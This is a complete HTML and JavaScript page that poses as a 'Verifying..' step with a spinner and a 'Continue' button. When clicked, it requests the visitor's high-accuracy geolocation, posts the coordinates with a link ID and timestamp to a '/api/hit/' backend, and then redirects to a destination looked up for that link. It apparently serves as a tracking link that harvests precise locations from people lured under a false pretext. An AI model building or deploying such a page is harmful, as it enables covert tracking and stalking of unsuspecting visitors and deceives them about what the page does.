<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifying..</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      background: #ffffff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
    }

    .container {
      text-align: center;
      padding: 20px;
    }

    /* Loading spinner */
    .loader {
      width: 50px;
      height: 50px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #007aff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      color: #666;
      font-size: 14px;
    }

    /* Button */
    button {
      background: #007aff;
      color: white;
      border: none;
      padding: 14px 40px;
      font-size: 18px;
      font-weight: 600;
      border-radius: 10px;
      cursor: pointer;
      font-family: inherit;
      transition: opacity 0.2s;
    }

    button:active {
      opacity: 0.8;
    }

    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    /* Status message */
    .status {
      margin-top: 20px;
      font-size: 14px;
      color: #666;
    }

    .status.success {
      color: #34c759;
    }

    .status.error {
      color: #ff3b30;
    }

    .hidden {
      display: none;
    }

    /* Location info */
    .location-info {
      margin-top: 20px;
      padding: 15px;
      background: #f5f5f5;
      border-radius: 10px;
      font-size: 13px;
      text-align: left;
      max-width: 300px;
    }

    .location-info p {
      margin: 5px 0;
      word-break: break-all;
    }
  </style>
</head>
<body>
<div class="container">
  <div id="loadingSection">
    <div class="loader"></div>
    <div class="loading-text">Loading...</div>
  </div>

  <div id="buttonSection" class="hidden">
    <button id="continueBtn">Continue</button>
  </div>

  <div id="status" class="status hidden"></div>
  <div id="locationInfo" class="location-info hidden"></div>
</div>

<script>
  // Get link ID from URL if exists
  const linkId = window.location.pathname.split('/').pop() || '';
  let destinationUrl = 'https://google.com';
  
  const loadingSection = document.getElementById('loadingSection');
  const buttonSection = document.getElementById('buttonSection');
  const continueBtn = document.getElementById('continueBtn');
  const statusDiv = document.getElementById('status');
  const locationInfoDiv = document.getElementById('locationInfo');
  
  let isProcessing = false;
  
  // Show loading for 2 seconds, then show button
  setTimeout(() => {
    loadingSection.classList.add('hidden');
    buttonSection.classList.remove('hidden');
  }, 2000);
  
  // Fetch destination URL if linkId exists
  if (linkId) {
    fetch('/api/hits/' + linkId)
      .then(r => r.json())
      .then(data => {
        if (data && data.dest) destinationUrl = data.dest;
      })
      .catch(() => {});
  }
  
  // Show status message
  function showStatus(message, type = '') {
    statusDiv.textContent = message;
    statusDiv.className = 'status ' + type;
    statusDiv.classList.remove('hidden');
  }
  
  // Show location details
  function showLocationDetails(lat, lon, acc) {
    locationInfoDiv.innerHTML = `
      <p><strong>✅ Location captured!</strong></p>
      <p>Latitude: ${lat}</p>
      <p>Longitude: ${lon}</p>
      <p>Accuracy: ±${acc} meters</p>
      <p>Redirecting in 2 seconds...</p>
    `;
    locationInfoDiv.classList.remove('hidden');
  }
  
  // Send location to backend
  function sendLocationToServer(lat, lon, acc) {
    const payload = {
      lat: lat,
      lon: lon,
      accuracy: acc,
      linkId: linkId || 'unknown',
      timestamp: Date.now()
    };
    
    fetch('/api/hit/' + (linkId || 'unknown'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(err => console.log('Send error:', err));
  }
  
  // Redirect to destination
  function redirect() {
    setTimeout(() => {
      window.location.href = destinationUrl;
    }, 2000);
  }
  
  // Request location permission
  function requestLocation() {
    if (isProcessing) return;
    isProcessing = true;
    
    // Disable button and show loading state
    continueBtn.disabled = true;
    continueBtn.textContent = 'Requesting...';
    
    showStatus('📍 Requesting location permission...', '');
    
    // Check if geolocation is supported
    if (!navigator.geolocation) {
      showStatus('❌ Geolocation is not supported by your browser', 'error');
      continueBtn.disabled = false;
      continueBtn.textContent = 'Continue';
      isProcessing = false;
      return;
    }
    
    // This triggers the browser's location permission popup
    navigator.geolocation.getCurrentPosition(
      // Success - User allowed
      function(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const accuracy = Math.round(position.coords.accuracy || 0);
        
        showStatus('✅ Location access granted!', 'success');
        showLocationDetails(latitude, longitude, accuracy);
        
        // Send to backend
        sendLocationToServer(latitude, longitude, accuracy);
        
        // Redirect after showing info
        redirect();
      },
      // Error - User denied or error
      function(error) {
        let errorMsg = '';
        
        switch(error.code) {
          case error.PERMISSION_DENIED:
            errorMsg = '❌ Location access denied. Please allow location and try again.';
            break;
          case error.POSITION_UNAVAILABLE:
            errorMsg = '❌ Location information unavailable. Try again.';
            break;
          case error.TIMEOUT:
            errorMsg = '❌ Location request timed out. Try again.';
            break;
          default:
            errorMsg = '❌ Could not get location. Try again.';
        }
        
        showStatus(errorMsg, 'error');
        
        // Reset button so user can try again
        continueBtn.disabled = false;
        continueBtn.textContent = 'Continue';
        isProcessing = false;
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  }
  
  // Button click handler
  continueBtn.addEventListener('click', requestLocation);
</script>
</body>
</html>
